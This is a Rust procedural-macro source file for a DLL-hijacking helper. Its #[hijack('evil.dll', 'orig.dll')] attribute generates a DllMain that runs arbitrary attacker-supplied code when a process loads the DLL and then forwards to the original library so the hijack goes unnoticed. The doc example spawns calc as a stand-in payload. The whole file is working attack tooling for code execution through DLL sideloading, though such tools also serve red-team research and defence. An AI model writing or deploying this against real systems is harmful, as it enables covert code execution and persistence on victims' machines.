use proc_macro::TokenStream;
use quote::quote;
use syn::parse::{Parse, ParseStream};
use syn::punctuated::Punctuated;
use syn::{parse_macro_input, Expr, ItemFn, Token};

struct Args {
    evil_dll_name: Expr,
    orig_dll_name: Expr,
}

impl Parse for Args {
    fn parse(input: ParseStream) -> syn::Result<Self> {
        let args = Punctuated::<Expr, Token![,]>::parse_terminated(input)?;
        Ok(Args {
            evil_dll_name: args.first().unwrap().to_owned(),
            orig_dll_name: args.last().unwrap().to_owned(),
        })
    }
}

/// # Dll hijack macro
/// ## example
///
/// ```rust
/// use std::process;
/// use dll_hijack_derive::hijack;
/// #[hijack("evil.dll", "orig.dll")]
/// fn evil() {
///     process::Command::new("calc").spawn().unwrap();
/// }
/// ```
#[proc_macro_attribute]
pub fn hijack(args: TokenStream, input: TokenStream) -> TokenStream {
    let args = parse_macro_input!(args as Args);
    let evil = parse_macro_input!(input as ItemFn).block;

    let evil_dll_name = args.evil_dll_name;
    let orig_dll_name = args.orig_dll_name;

    let tokens = quote! {
        use dll_hijack::{HMODULE, TRUE, BOOL};
        use dll_hijack::{
            DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
        };
        use std::ffi::c_void;
        use dll_hijack::dll_hijack;

        #[no_mangle]
        pub extern "stdcall" fn DllMain(
            h_module: HMODULE,
            ul_reason_for_call: u32,
            _reserved: *mut c_void,
        ) -> BOOL {
            match ul_reason_for_call {
                DLL_PROCESS_ATTACH => {
                    #evil
                    dll_hijack(h_module, #evil_dll_name, #orig_dll_name);
                },
                DLL_THREAD_ATTACH => (),
                DLL_THREAD_DETACH => (),
                DLL_PROCESS_DETACH => (),
                _ => (),
            }

            TRUE
        }
    };

    tokens.into()
}
